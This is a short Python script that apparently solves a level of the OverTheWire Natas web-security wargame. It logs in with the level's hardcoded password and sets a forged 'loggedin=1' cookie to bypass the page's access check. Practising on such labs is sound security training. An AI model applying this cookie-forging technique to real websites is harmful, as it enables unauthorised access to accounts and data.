import requests

username = "natas5"
password = "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"

url = f"http://{username}.natas.labs.overthewire.org/"
#  headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
cookies = {"loggedin": "1"}

print(url)

session = requests.Session()
response = session.get(url, auth = (username, password), cookies=cookies)
content = response.text

print(session.cookies['loggedin'])
print(content)
print(response.headers)
print(session.cookies)


